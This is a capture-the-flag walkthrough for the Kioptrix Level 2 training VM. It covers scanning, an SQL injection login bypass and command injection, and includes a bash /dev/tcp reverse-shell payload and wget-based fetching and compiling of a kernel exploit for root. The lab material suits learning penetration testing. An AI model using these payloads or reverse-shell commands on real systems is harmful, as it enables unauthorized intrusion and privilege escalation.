# Kioptrix-level-2
  
this Kioptrix VM Image is an easy challenge. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways than one to complete the challenges.
 
##  Gain root access on this machine:  ##

####  Start the Kioptrix VM on VirtualBox or VMware ####
 ![Kioptrix_Level_1-1](https://user-images.githubusercontent.com/58820314/112413283-9997c200-8d28-11eb-877e-4c53a79bb04e.png)
 
 • Know your IP and interface using this command : **sudo ifconfig**
 ![1](https://user-images.githubusercontent.com/58820314/112559678-264e8880-8dda-11eb-8fec-2aaa8ea44a23.png)

 • Discover the Network to obtain the IP of this machine with : **sudo netdiscover -i eth0** 
  ![2](https://user-images.githubusercontent.com/58820314/112559689-2f3f5a00-8dda-11eb-8e10-20b8d3712b41.png)
  ![3](https://user-images.githubusercontent.com/58820314/112559732-48e0a180-8dda-11eb-98f6-ee6c2733980c.png)

• Next step is to scan for vulnerabilities using **Nmap** by this command: **nmap -A -T4 192.168.3.132**
![4](https://user-images.githubusercontent.com/58820314/112559782-631a7f80-8dda-11eb-82b3-34276d19a3bd.png)

 ### we will open the web page of this machine and try some **SQL and command injection**   ###
  ### we are notice that SQL injection is : **'or'1'='1** at **Username** and **Password** fields  ###
 ![5](https://user-images.githubusercontent.com/58820314/112559901-a07f0d00-8dda-11eb-8214-152cb7486060.png)
  ### Now we are tying **Command Injection** code : **ping ; id** ### 
  ![6](https://user-images.githubusercontent.com/58820314/112560120-269b5380-8ddb-11eb-8f7d-c0777d78e2bd.png)
### Here we have the output is showing that the user is **apache** ###
![7](https://user-images.githubusercontent.com/58820314/112560193-521e3e00-8ddb-11eb-9ae9-34174ab6bd7a.png)
### Now we will try to listen on specific port like : 800  using reverse shell ###
### commands foe reverse shell are : **sudo nc -lvnp 800** and on the field of web console :**ping ; bash -i >& /dev/tcp/192.168.3.131/800 0>&1** ###
![9](https://user-images.githubusercontent.com/58820314/112560379-c0fb9700-8ddb-11eb-8d8c-4cfcb4f63ff5.png)
![8](https://user-images.githubusercontent.com/58820314/112560392-c527b480-8ddb-11eb-9fec-a6a39f03a7b5.png)
### The Next step is to make the shell more interactive and  stable with this command : **python -c 'import pty;pty.spawn("/bin/bash")'** ###
### The other commands used to know the  **type of kernel** , **OS operated** , **Version of kernel**   
![10](https://user-images.githubusercontent.com/58820314/112561081-29974380-8ddd-11eb-9afa-8761df3cd0b3.png)
### Now move the exploit file  to  **/var/www/html/** to be downloaded on the machine using this command ****wget http://192.168.3.132****
### at the next step to run the **C** exploit file using **gcc compiler** with this command **gcc k.c** and the output is **a.out** file  
### The last step is to Execute the output file with this command : **./a.out** . 
![11](https://user-images.githubusercontent.com/58820314/112987084-9a828680-9162-11eb-9cb2-c63ae340e5f4.png)

# Best of luck #
